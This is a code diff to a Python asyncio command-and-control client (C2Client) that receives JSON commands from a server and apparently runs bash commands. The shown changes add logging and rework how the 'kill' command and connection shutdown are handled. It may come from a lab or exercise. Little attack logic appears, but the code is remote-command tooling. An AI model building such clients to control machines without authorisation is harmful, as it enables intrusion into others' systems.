@@ -44,8 +44,10 @@ async def send_message(writer, message: Dict) -> bool:
 async def receive_message(reader) -> Dict:
     """Receive JSON message"""
     try:
+        logger.info("Waiting for message...")
         length_data = await asyncio.wait_for(reader.readexactly(4), timeout=30)
         length = int.from_bytes(length_data, 'big')
+        logger.info(f"Received message length: {length}")
         
         payload = await asyncio.wait_for(reader.readexactly(length), timeout=30)
         plaintext = json.loads(payload.decode())
@@ -53,6 +55,9 @@ async def receive_message(reader) -> Dict:
         return plaintext if plaintext else None
     except asyncio.TimeoutError:
         logger.debug("Receive timeout (normal for idle connections)")
+        return None
+    except asyncio.IncompleteReadError:
+        logger.debug("Connection closed")
         return None
     except Exception as e:
         logger.error(f"Failed to receive message: {e}")
@@ -93,6 +98,7 @@ class C2Client:
             )
             
             # Receive acknowledgment
+            logger.info("Waiting for acknowledgment...")
             ack = await receive_message(self.reader)
             if ack and ack.get("type") == "ack":
                 logger.info(f"Registered as {ack.get('client_id')}")
@@ -146,8 +152,10 @@ class C2Client:
         try:
             await asyncio.gather(*tasks)
         except asyncio.CancelledError:
+            logger.info("Client main loop cancelled")
             pass
         finally:
+            logger.info("Client canceling tasks")
             for task in tasks:
                 task.cancel()
     
@@ -155,8 +163,9 @@ class C2Client:
         """
         STEP 1 & 4: Listen for incoming commands from server
         """
-        while self.running and self.reader:
+        while self.running and self.reader and not self.reader.at_eof():
             try:
+                logger.info("Listening for command")
                 msg = await receive_message(self.reader)
                 
                 if not msg:
@@ -196,6 +205,7 @@ class C2Client:
         while self.running:
             try:
                 # Get command with timeout
+                logger.info("Waiting for command in _command_processor")
                 cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                 
                 cmd_id = cmd_data.get("cmd_id")
@@ -206,7 +216,12 @@ class C2Client:
                 start_time = time.time()
                 
                 if command.lower() == "kill":
-                    result = await self._process_kill_command(cmd_id)
+                    logger.info("Kill command received, exiting")
+                    result = "Client killed by server"
+                    self.running = False
+                    # Close reader to stop listener from reading
+                    if self.reader:
+                        self.reader.feed_eof()
                 
                 elif command.lower().startswith("echo"):
                     # Extract the echo text
@@ -235,32 +250,19 @@ class C2Client:
                         },
                     )
                     logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
+                
+                # Exit after sending kill result
                 if not self.running:
-                    os._exit(0)  # Force exit
+                    return
+                # if not self.running:
+                #     os._exit(0)  # Force exit
             
             except asyncio.TimeoutError:
                 continue
             except Exception as e:
                 logger.error(f"Command processor error: {e}")
 
-    async def _process_kill_command(self, cmd_id: str) -> str:
-        logger.info("Kill command received, exiting")
-        result = "Client killed by server"
-        
-        # Send result first, then exit
-        if self.writer and not self.writer.is_closing():
-            await send_message(
-                self.writer,
-                {
-                    "type": "result",
-                    "cmd_id": cmd_id,
-                    "result": result,
-                    "exec_time_ms": 0
-                },
-            )
-        
-        self.running = False
-        return result
+
     
     def _execute_bash_command(self, command: str) -> str:
         """
